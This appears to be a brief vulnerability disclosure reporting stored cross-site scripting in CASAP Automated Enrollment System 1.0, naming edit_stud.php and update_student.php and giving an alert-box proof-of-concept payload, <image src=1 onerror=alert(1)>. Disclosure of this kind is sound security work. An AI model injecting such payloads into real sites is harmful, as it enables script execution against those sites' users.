* Exploit Title: CASAP-Automated-Enrollment-System 1.0 - Stored cross-site scripting   
* Vendor Homepage： https://www.sourcecodester.com/php/12210/casap-automated-enrollment-system.html  
* Software Link:https: https://www.sourcecodester.com/download-code?nid=12210&title=CASAP+Automated+Enrollment+System+using+PHP%2FMySQLi+with+Source+Code  
* Version: 1.0  
* Vulnerable file:  
edit_stud.php  
![image](https://github.com/BigTiger2020/CASAP-Automated-Enrollment-System/blob/main/edit_stud-xss.png)  
![image](https://github.com/BigTiger2020/CASAP-Automated-Enrollment-System/blob/main/edit_stud-xss-2.png)  
update_student.php  
![image](https://github.com/BigTiger2020/CASAP-Automated-Enrollment-System/blob/main/update_student.png)  
* Vulnerability proof :    
Script statement：<image src=1 onerror=alert(1)>
![image](https://github.com/BigTiger2020/CASAP-Automated-Enrollment-System/blob/main/xss.png)
